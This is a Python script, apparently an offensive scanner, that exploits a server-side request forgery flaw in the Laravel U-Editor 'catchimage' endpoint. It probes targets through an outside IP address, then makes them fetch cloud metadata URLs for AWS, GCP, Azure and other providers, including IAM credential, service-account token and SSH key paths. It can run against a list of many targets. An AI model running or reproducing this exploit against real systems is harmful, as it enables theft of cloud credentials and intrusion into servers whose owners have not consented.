#!/usr/bin/env python3
import requests
import re
import argparse
import time
import json
from urllib.parse import urlparse, urljoin

# ANSI color codes for better output visibility
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
ENDC = "\033[0m"

# Initial test payload
INITIAL_TEST_PAYLOAD = "http://167.71.230.48:8000/6386100134772803994460154.gif"

# List of metadata URLs to test
SSRF_PAYLOADS = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
        "http://169.254.169.254/latest/meta-data/public-ipv4"
    ],
    "Alibaba Cloud": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/meta-data/image-id",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2019-06-01",
        "http://169.254.169.254/metadata/instance/compute?api-version=2019-06-01"
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/user-data"
    ],
    "Tencent Cloud": [
        "http://metadata.tencentyun.com/latest/meta-data/",
        "http://metadata.tencentyun.com/latest/meta-data/uuid"
    ]
}

def print_banner():
    banner = f"""
{BLUE}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║  Laravel U-Editor SSRF Scanner                            ║
║  Test for cloud metadata exposure via SSRF vulnerability  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝{ENDC}
    """
    print(banner)
    print(f"{YELLOW}[*] Starting SSRF test against Laravel U-Editor{ENDC}")

def test_ssrf(base_url, payload):
    """Test a single SSRF payload URL against the target"""
    # Ensure the base path remains the same
    parsed_url = urlparse(base_url)
    target_path = "/laravel-u-editor-server/server"

    # Construct the full URL while preserving the domain from base_url
    if not parsed_url.scheme:
        # If no scheme provided, default to https
        base_domain = f"https://{parsed_url.netloc or parsed_url.path}"
    else:
        base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"

    # Construct the full target URL
    target_url = urljoin(base_domain, f"{target_path}?action=catchimage&source[]={payload}")

    try:
        print(f"{YELLOW}[*] Testing: {payload}{ENDC}")
        print(f"{BLUE}[>] Full URL: {target_url}{ENDC}")

        # Send the request
        response = requests.get(target_url, timeout=10)

        # Check if the response contains SUCCESS
        if response.status_code == 200:
            try:
                json_response = response.json()
                # Pretty print the response for debugging
                print(f"{BLUE}[Debug] Response: {json.dumps(json_response, indent=2)}{ENDC}")

                # Check if 'SUCCESS' is in the response
                if "SUCCESS" in response.text:
                    print(f"{GREEN}[+] Potential SSRF vulnerability found!{ENDC}")
                    print(f"{GREEN}[+] Target responded with SUCCESS for: {payload}{ENDC}")
                    return True, response.text
                else:
                    print(f"{RED}[-] No success response{ENDC}")
            except json.JSONDecodeError:
                # If response is not JSON but contains SUCCESS
                if "SUCCESS" in response.text:
                    print(f"{GREEN}[+] Non-JSON SUCCESS response for: {payload}{ENDC}")
                    return True, response.text
                else:
                    print(f"{RED}[-] Invalid JSON response{ENDC}")
        else:
            print(f"{RED}[-] Failed request: Status code {response.status_code}{ENDC}")

        return False, None

    except requests.RequestException as e:
        print(f"{RED}[-] Request failed: {str(e)}{ENDC}")
        return False, None

def process_target(target_url, delay):
    """Process a single target URL by first testing with the initial payload, then metadata if successful"""
    print(f"\n{BLUE}[*] Processing target: {target_url}{ENDC}")

    # First test with the initial payload
    success, response = test_ssrf(target_url, INITIAL_TEST_PAYLOAD)

    if not success:
        print(f"{RED}[-] Initial test failed for {target_url}. Skipping metadata tests.{ENDC}")
        return []

    print(f"{GREEN}[+] Initial test successful! Testing metadata endpoints...{ENDC}")

    # If initial test was successful, test metadata endpoints
    successful_payloads = []

    # Test each cloud provider's metadata URLs
    for provider, urls in SSRF_PAYLOADS.items():
        print(f"\n{BLUE}[*] Testing {provider} metadata URLs...{ENDC}")

        for url in urls:
            success, response = test_ssrf(target_url, url)
            if success:
                successful_payloads.append((provider, url, response, target_url))

            # Add delay between requests to avoid overloading the server
            time.sleep(delay)

    return successful_payloads

def main():
    parser = argparse.ArgumentParser(description="Test Laravel U-Editor for SSRF vulnerabilities")
    parser.add_argument("-u", "--url", help="Single target URL to test")
    parser.add_argument("-f", "--file", help="File containing list of URLs to test (one per line)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either a URL (-u) or file with URLs (-f) must be provided")

    print_banner()

    all_successful_payloads = []

    # Process single URL if provided
    if args.url:
        all_successful_payloads.extend(process_target(args.url, args.delay))

    # Process URLs from file if provided
    if args.file:
        try:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]

            print(f"{BLUE}[*] Loaded {len(urls)} URLs from {args.file}{ENDC}")

            for url in urls:
                all_successful_payloads.extend(process_target(url, args.delay))
        except FileNotFoundError:
            print(f"{RED}[-] File not found: {args.file}{ENDC}")
            return
        except Exception as e:
            print(f"{RED}[-] Error reading file: {str(e)}{ENDC}")
            return

    # Print summary of results
    print("\n" + "="*80)
    print(f"{BLUE}[*] SSRF Testing Summary:{ENDC}")
    print("="*80)

    if all_successful_payloads:
        print(f"\n{GREEN}[+] Found {len(all_successful_payloads)} successful SSRF payloads:{ENDC}")

        # Group by target URL
        by_target = {}
        for provider, url, response, target in all_successful_payloads:
            if target not in by_target:
                by_target[target] = []
            by_target[target].append((provider, url, response))

        # Print results grouped by target
        for target, payloads in by_target.items():
            print(f"\n{BLUE}[*] Target: {target}{ENDC}")
            print("-" * 60)

            for provider, url, response in payloads:
                print(f"{GREEN}[+] Provider: {provider}{ENDC}")
                print(f"{GREEN}[+] URL: {url}{ENDC}")
                print(f"{YELLOW}[+] Response: {response[:150]}...{ENDC}" if len(response) > 150 else f"{YELLOW}[+] Response: {response}{ENDC}")
                print("-" * 40)

        print(f"\n{GREEN}[+] The target(s) appear to be vulnerable to SSRF attacks!{ENDC}")
        print(f"{YELLOW}[*] You may want to further investigate these successful endpoints.{ENDC}")
    else:
        print(f"\n{RED}[-] No successful SSRF payloads found.{ENDC}")
        print(f"{YELLOW}[*] The target(s) may not be vulnerable, or they may be filtering these specific URLs.{ENDC}")

if __name__ == "__main__":
    main()
